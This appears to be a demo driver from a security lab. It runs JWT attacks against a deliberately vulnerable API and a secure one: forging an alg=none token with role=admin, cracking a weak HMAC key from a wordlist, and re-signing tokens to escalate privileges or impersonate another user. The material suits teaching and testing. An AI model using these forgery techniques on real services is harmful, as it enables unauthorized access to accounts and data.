import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import jwt_privesc as j  # noqa: E402

for name, api in (("VULNERABLE", j.VulnerableAPI()), ("SECURE", j.SecureAPI())):
    print(f"===== {name} API =====")
    tok = api.issue("u-alice")
    header, claims = j.decode_unverified(tok)
    print("alice's token header:", header, "claims:", claims)
    print("alice GET /payouts with her own token ->", api.get_payouts(tok))

    t1 = j.forge_alg_none(tok, role="admin")
    print("attack 1: alg=none + role=admin ->", api.get_payouts(t1))

    key = j.crack_hs256(tok, j.WORDLIST)
    print("attack 2: crack the HMAC key with an 8-word list ->", "FOUND (FAKE lab secret)" if key else "not found")
    if key:
        t2 = j.forge_with_key(tok, key, role="admin")
        print("          re-sign with role=admin ->", api.get_payouts(t2))
        t3 = j.forge_with_key(tok, key, sub="u-carol")
        print("          re-sign with sub=u-carol ->", api.get_payouts(t3))
    print()
